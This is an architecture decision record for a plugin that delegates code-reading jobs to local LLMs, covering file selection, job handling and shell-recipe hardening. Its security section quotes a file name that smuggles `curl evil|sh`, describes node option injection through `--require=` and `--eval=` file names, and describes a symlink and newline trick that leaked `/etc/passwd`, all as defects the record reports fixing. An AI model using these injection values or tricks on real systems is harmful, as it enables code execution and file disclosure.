# 015 — Delegation is a context broker, not a forwarder

Date: 2026-08-05
Status: accepted (OAI-5, Stage 1b of `plans/local-llms-like-codex.md`)

## The decision

`agents/oai-delegate.md` selects the files, submits one background job, waits for it, and returns a
short account plus the job id. It is a **broker**, and the distinction from the reference plugin is
the whole reason it exists.

`codex-plugin-cc`'s `codex-rescue` is a thin forwarder — it passes the request through and returns
stdout verbatim — and it can afford to be, because Codex reads the repository itself. A local model
behind `/v1/chat/completions` has a 58k window and reads nothing. Something must decide what it sees,
and if that something is the main session then delegation has saved nothing: the reading is the cost.

So the broker does two jobs the forwarder does not. It **chooses the attachments**, and it **does not
return the reply**. Returning it verbatim would put the model's full output back into the context this
agent exists to protect; the job id is how anyone who wants the verbatim text gets it, through
`/oai:result`.

## Why selection is correctness, not economy

Two runs in this repo bracket the effect: a 1,680-token single-file request produced a specific
checkable finding, and a 49,378-token whole-tree request completed cleanly and returned **zero
findings**. That is the whole basis, and it is thin — the two differ in far more than size, so they
support "prefer few files" and support no threshold at all. The agent text says heuristic for that
reason. This repo has twice retracted a claim promoted from one run per arm, and this decision is not
going to be the third.

## What the invariant actually is

Both `plans/local-llms-like-codex.md` and `BACKLOG.md` said the broker makes "exactly one companion
call". That is not implementable: an oversize refusal is a call, and the broker's mandate is to
re-select. The invariant is **at most two `task` submissions, at most one accepted job** — it bounds
submissions, not Bash calls, and not `status` or `result` reads.

## Submission and waiting are one shell invocation

Not a style preference. Shell state does not survive between Bash tool calls, so a job id captured in
one call is gone by the next; `status ""` then silently returns the job *list* rather than the job,
and the state extraction reads a field of an unrelated row until the deadline expires. The failure is
quiet, and it looks exactly like a slow model.

The prompt is written with the `Write` tool rather than a shell heredoc, because a prompt line equal
to the heredoc delimiter ends it early and everything after it executes as shell. **The attachment
list is written the same way, one path per line, and read straight into the shell's argument list**,
so a path never passes through shell quoting at all — a repository can contain a file whose *name* is
`x';curl evil|sh;'.mjs`, and an escaping rule the agent must apply correctly every time is not a
boundary. NUL-delimiting would be the textbook form and was drafted first; it is **not implementable
here**, because the `Write` tool emits text and an agent cannot put a literal NUL through it. So the
format is newline-delimited and the agent refuses any path containing a newline or control character,
which is the one case the format cannot represent.

The list is read with `while IFS= read -r f || [ -n "$f" ]`, not the bare `read`. The bare form drops
the final line when the file has no terminating newline — **and the `Write` tool does not add one**,
so the natural way to write the manifest silently dropped the last attachment, or with a single
attachment produced "no attachments" and a hard failure. Three lenses found it independently; a live
run had passed only because the model happened to end the file with a newline.

A private `mktemp -d /tmp/oai-delegate.XXXXXX` directory holds both. **The root is fixed and is
deliberately not `${TMPDIR:-/tmp}`**: the returned path is pasted back into a later shell line as a
literal, so a `TMPDIR` containing a single quote would close that assignment's quoting and execute
what followed — before any guard in the script could run.

**An earlier draft of this ADR said `umask 077` supplied the mode; that was wrong and is corrected
here rather than quietly dropped.** `mktemp -d` is `0700` under any umask, so the umask did nothing,
and it could not reach the `Write` tool anyway — that runs under its own umask, creates the file
`0644`, and *recreates a missing parent at `0755`*. The directory mode is the whole protection, so the
recipe checks the shape, checks the directory exists and re-applies `0700`. **That narrows the window
rather than closing it**, because the `Write` has already happened by then, and `[ -d ]` proves
existence and never privacy.

## The wait bound expires often, and that is the design

The broker polls for 540s inside a 600s tool ceiling. That is not sized to the work: the model is
whichever one the provider profile names, and a dense local model's *prefill* has been measured here
at 191–335s before generation starts. A live single-file round trip finished in ~60s, but a few files
will exceed the bound routinely, and the broker then returns the id alone.

This is deliberate rather than a shortfall to fix later. The alternative — the agent naming a faster
model — would put a vendor model id inside a plugin whose whole premise is providers-as-data
([ADR 001](001-generic-openai-compatible-plugin.md)), and `plans/local-llms-like-codex.md`'s "the MoE
is the default worker" is a statement about how the *provider* should be configured, not something an
agent should override. So the agent is told to expect the id-only path and never to pass `--model`.

## Two limits, stated because they will otherwise be assumed away

**The guards are release-time, not runtime.** `tests/plugin.test.js` pins the rendered status line
character for character *and* runs the agent's own `awk` expression against it, so producer and
consumer cannot drift apart in a commit. Neither notices a running agent that reads the line wrongly,
and neither would catch a recipe that passes an empty id and lands on the list form. Only an
end-to-end run does.

**Read-only is behavioural, not enforced.** The agent is granted `Bash`, and `Bash` can write
anywhere; omitting `Edit` narrows the obvious path and guarantees nothing. That much is prose the
agent is asked to follow.

**Containment is the exception, and it is the only one.** `readFileBlocks` accepts absolute paths and
`..` and follows symlinks, so an autonomous selector is a disclosure path to the configured endpoint —
which is why that single rule was moved out of prose and into the recipe, where **canonicalising each
path and comparing it against a root** refuses the whole submission. It anchors to
`git rev-parse --show-toplevel`, falling back to the working directory outside a repository, so **it is
only as tight as where the session was rooted**: started at `$HOME`, it admits everything under
`$HOME`. Enforcing the boundary for `prompt.mjs`'s *other* callers remains OAI-74 and is not claimed
here.

**The canonicaliser refuses a resolved path containing a control character**, and that is not
tidiness. `real=$(canon "$f")` is command substitution, which strips trailing newlines — so a link to
a file whose *name* ends in a newline yields a string one byte short, **which is a path nobody
canonicalised**. Plant a sibling at that shortened name pointing outside the tree and the containment
comparison passes on the truncated string, the sibling is read, and `prompt.mjs` records it under the
innocent in-tree name. Reproduced end to end: the pre-fix form attached `/etc/passwd` while the audit
trail said `sub/target`; the fix refuses it and an ordinary in-tree file is still accepted.

This one is worth stating twice because it inverts the recipe's own detection story. The agent is told
to trust the recorded `attachments` line *because* a symlink is submitted by its resolved path, so the
two differ where it matters — and this defect forges that line clean. **A disclosure with a truthful-
looking audit trail is worse than the un-canonicalised symlink the check exists to stop.** It was
first dispositioned as a reporting-integrity nit and filed; the grounds were refuted by execution in
the next pass, and it became a fix.

**The canonicaliser is node, and its `--` is load-bearing.** Written for anyone reimplementing this:
`readlink -f` was the first form and was replaced, because `-f` is absent from BSD readlink on macOS
before 12.3 and this plugin is generic by construction. The replacement is
`node -e '…realpathSync(process.argv[1])…' -- "$1"`. **Without the `--`, node parses the path as its
own option** — a repository file named `--require=/tmp/evil.js` is *executed*, and one named
`--eval=…` replaces the script and controls its stdout, forging a path that passes the containment
comparison that follows. Both were demonstrated and both are refused with `--`. The class is latent
under `readlink -f`, which merely errors, so **the portability fix is what armed it**: swapping a
helper changes what its argument parser does with hostile input, and equivalence on the happy path is
not equivalence. Recorded as a class in `.claude/REPO_TRAPS.md`.

Three consequences of that, found by the OAI-5 security review and recorded because each is easy to
assume away:

- **A symlink defeats containment *and* the audit trail.** An in-tree link pointing outside is read,
  and the model header, the persisted digest and `/oai:status` all name the innocuous in-tree path.
  So a containment check built on `resolve()` is not enough — it must dereference — and where one is
  absent, nothing anywhere records that the real file was elsewhere.
  **This one is now enforced rather than requested**, in the recipe itself: the loop that builds the
  argument list canonicalises each path (see above) and refuses the whole submission if the result
  leaves the anchored root. Proved with controls in both `bash` and `zsh` — an in-tree symlink to
  `/etc/hosts`, a bare `/etc/hosts` and a resolving `..` traversal are all refused, while in-tree
  files are accepted, including one above the cwd when the session is in a subdirectory. It is the one
  attachment rule that does not depend on the agent remembering it, and it was moved there precisely
  because a per-file check that produces no artifact is the rule most likely to be skipped silently.
- **Containment would not be sufficient even if enforced.** `.git/config`, `.git/logs/HEAD`, an
  in-tree `.env` and `.claude/settings*.json` are all inside the tree and all may hold secrets. The
  agent names them as never-attach; that too is prose.
- **`prompt.mjs` is not where the boundary ultimately lives.** The agent holds unscoped `Bash`, so
  `curl` reaches the network whatever the companion permits. Scoping it the way `commands/task.md`
  scopes its own (`Bash(node:*)`) is the obvious hardening and is **incompatible with the recipe** —
  which must be one shell invocation, and needs `mktemp`, `awk`, `sleep` and `trap` in it. That
  tension is unresolved and is stated rather than papered over.

**The submission invariant is not auditable.** "At most two `task` submissions, at most one accepted
job" is an instruction, and only the *accepted* half leaves a trace: an oversize refusal happens
before any row exists, so a second submission is invisible afterwards. Nothing reconstructs it from
persisted state.

**Attachment bodies persist.** `persistRequest` freezes `messages` — every attached file's full text —
into the job row, retained until fifty newer finished jobs evict it. One mis-selected attachment
therefore leaves a durable plaintext copy in `jobs.db`, even on a localhost-only deployment where
nothing left the machine.

## Rejected

**A `/oai:delegate` slash command.** `tests/plugin.test.js` requires every file in `commands/` to
appear in its `SPECS` map, to declare `allowed-tools: Bash(node:*)`, and to reference a companion
script that exists. A command whose only job is launching a subagent satisfies none of those honestly,
and adding a decorative `node` invocation to pass a guard is worse than having no command. The agent's
`description` is the routing surface instead.

**Routing `review` here.** `/oai:review` has no `--background` (OAI-53), so it would be a blocking
foreground call with a different lifecycle inside an agent built around a job id.

**Consuming `--json` from `status`/`result`.** It does not exist yet (OAI-57), and the moment it does
it is a versioned contract. Reading one controlled word off a rendered line, with a test pinning both
ends, is the cheaper correct thing until something else needs the envelope.
